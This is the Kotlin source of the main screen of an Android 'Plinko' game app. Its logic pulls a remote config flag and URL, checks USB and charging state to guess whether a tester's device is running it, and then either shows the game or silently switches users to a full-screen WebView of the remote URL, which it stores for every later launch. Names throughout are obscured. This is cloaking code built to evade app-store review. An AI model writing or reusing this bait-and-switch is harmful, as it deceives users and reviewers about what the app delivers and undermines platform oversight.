package plinko.testyouluck.com

import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.AdRequest
import com.google.android.gms.ads.AdView
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import plinko.testyouluck.com.databinding.ActivityMainBinding
import plinko.testyouluck.com.util.DataStoreManager
import plinko.testyouluck.com.util.Lottie
import plinko.testyouluck.com.util.Once
import plinko.testyouluck.com.util.getBatteryPercentage
import plinko.testyouluck.com.util.internetConnection
import plinko.testyouluck.com.util.isBatteryCharging
import plinko.testyouluck.com.util.isUSB
import plinko.testyouluck.com.util.log
import plinko.testyouluck.com.util.setVisible
import plinko.testyouluck.com.webView.WebViewFragment
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val ANNASON_KEY = 1111
        var uraAnnasonDimon   = ""

        val zapuskEkranidze = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie
    private lateinit var banner: AdView

    val webViewFragment = WebViewFragment(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkIsAnnassonOrParmezano()
//            startFragUID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                zapuskEkranidze.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            banner.setVisible(View.VISIBLE)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        ANNASON_KEY         -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        banner        = binding.banner.apply { loadAd(AdRequest.Builder().build()) }
        webViewFragment.onCreate(coroutine, binding.parmezano)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkIsAnnassonOrParmezano() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Parmezano" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        uraAnnasonDimon = it
                        zapuskEkranidze.emit(ANNASON_KEY)
                    }
                }
                "Annason" -> {
                    log("DataStoreManager Key = GAME")
                    zapuskEkranidze.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    otrimatiIsAnnasona()
                }
            }
        }
    }

    private fun otrimatiIsAnnasona() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = JSONObject(getString("ball"))
                        log("success = $jsonData")

                        checkAnnanassa(
                            season = jsonData.getString("season"),
                            pass   = jsonData.getString("pass")
                        )
                    } else {
                        zapuskEkranidze.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    zapuskEkranidze.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun checkAnnanassa(season: String, pass: String) {
        if (season=="true") {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                openAnnason()
            } else {
                openParmezano(pass)
            }
        } else {
            openAnnason()
        }
    }

    private fun openAnnason() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Annason" }
            zapuskEkranidze.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openParmezano(second: String) {
        uraAnnasonDimon = second
        zapuskEkranidze.tryEmit(ANNASON_KEY)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Parmezano" }
            DataStoreManager.Link.update { uraAnnasonDimon }
        }
    }

}